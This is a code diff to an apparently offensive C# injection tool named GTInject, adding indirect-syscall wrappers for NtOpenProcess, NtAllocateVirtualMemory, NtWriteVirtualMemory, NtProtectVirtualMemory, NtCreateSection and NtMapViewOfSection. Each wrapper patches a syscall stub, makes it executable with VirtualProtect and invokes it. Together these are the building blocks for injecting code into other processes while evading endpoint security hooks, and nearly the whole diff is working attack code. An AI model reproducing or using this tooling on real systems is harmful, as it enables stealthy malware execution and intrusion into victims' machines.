@@ -5,6 +5,7 @@ using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using static GTInject.memoryOptions.memory;
 
 namespace GTInject.SysCalls
 {
@@ -272,6 +273,154 @@ namespace GTInject.SysCalls
         // Indirect Syscalls
         ////////////////////////////
 
+        public static WinNative.NTSTATUS IndirectSysclNtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref SysCalls.WinNative.OBJECT_ATTRIBUTES ObjectAttributes, ref SysCalls.WinNative.CLIENT_ID ClientId)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4],syscallMemAddr) = GetIndirectSysCall("NtOpenProcess");
+
+            //Format our memory address
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+
+            // Flip it and write it into the stub
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!SysCalls.WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtOpenProcess assembledFunction = (Delegates.DelgNtOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtOpenProcess));
+
+                    return (WinNative.NTSTATUS)assembledFunction(ref ProcessHandle, AccessMask, ref ObjectAttributes, ref ClientId);
+                }
+            }
+        }
+
+        public static WinNative.NTSTATUS IndirectSysclNtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionZize, UInt32 AllocationType, UInt32 Protect)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtAllocateVirtualMemory");
+
+            //Format our memory address
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+
+            // Flip it and write it into the stub
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!SysCalls.WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)SysCalls.WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtAllocateVirtualMemory assembledFunction = (Delegates.DelgNtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtAllocateVirtualMemory));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionZize, AllocationType, Protect);
+                }
+            }
+        }
+
+        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, IntPtr buffer, UInt32 Length, ref UInt32 bytesWritten)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4],syscallMemAddr) = GetIndirectSysCall("NtWriteVirtualMemory");
+
+            //Format our memory address
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+
+            // Flip it and write it into the stub
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtWriteVirtualMemory assembledFunction = (Delegates.DelgNtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtWriteVirtualMemory));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(hProcess, baseAddress, buffer, (uint)Length, ref bytesWritten);
+                }
+            }
+        }
+
+        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtProtectVirtualMemory");
+
+            //Format our memory address
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+
+            // Flip it and write it into the stub
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtProtectVirtualMemory assembledFunction = (Delegates.DelgNtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtProtectVirtualMemory));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ProcessHandle, ref BaseAddress, ref RegionSize, NewProtect, ref OldProtect);
+                }
+            }
+        }
+
         public static SysCalls.WinNative.NTSTATUS IndirectSysclNtCreateThreadEx(out IntPtr threadHandle, WinNative.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
         {
 
@@ -309,9 +458,87 @@ namespace GTInject.SysCalls
             }
         }
 
+
+        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtCreateSection");
+
+            //Format our memory address
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+
+            // Flip it and write it into the stub
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtCreateSection assembledFunction = (Delegates.DelgNtCreateSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtCreateSection));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(ref SectionHandle, DesiredAccess, ObjectAttributes, ref MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
+                }
+            }
+        }
+
+        public static SysCalls.WinNative.NTSTATUS IndirectSysclNtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
+        {
+            // dynamically resolve the syscall
+            byte[] syscall = bIndirectSysCallStub;
+            IntPtr syscallMemAddr;
+            (syscall[4], syscallMemAddr) = GetIndirectSysCall("NtMapViewOfSection");
+
+            //Format our memory address
+            var syscallmemstring = string.Format("{0:X2}", syscallMemAddr.ToInt64());
+            byte[] syscallInstructionSuffix = StringToByteArray(string.Format("{0:X2}", syscallMemAddr.ToInt64()));
+            byte[] syscallInstructionPrefix = new byte[2] { 0x00, 0x00 };
+            byte[] syscallInstruction = new byte[syscallInstructionPrefix.Length + syscallInstructionSuffix.Length];
+            System.Buffer.BlockCopy(syscallInstructionPrefix, 0, syscallInstruction, 0, syscallInstructionPrefix.Length);
+            System.Buffer.BlockCopy(syscallInstructionSuffix, 0, syscallInstruction, syscallInstructionPrefix.Length, syscallInstructionSuffix.Length);
+
+            // Flip it and write it into the stub
+            Array.Reverse(syscallInstruction, 0, syscallInstruction.Length);
+            System.Buffer.BlockCopy(syscallInstruction, 0, syscall, 10, syscallInstruction.Length);
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!WinNative.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)WinNative.AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.DelgNtMapViewOfSection assembledFunction = (Delegates.DelgNtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.DelgNtMapViewOfSection));
+
+                    return (SysCalls.WinNative.NTSTATUS)assembledFunction(SectionHandle, ProcessHandle, ref BaseAddress, ZeroBits, CommitSize, out SectionOffset, out ViewSize, InheritDisposition, AllocationType, Win32Protect);
+                }
+            }
+        }
+
+
+
         ////////////////////////////
         // Other Functions
         ////////////////////////////
+
         private static IntPtr GetNtdllBaseAddress()
         {
             Process hProc = Process.GetCurrentProcess();
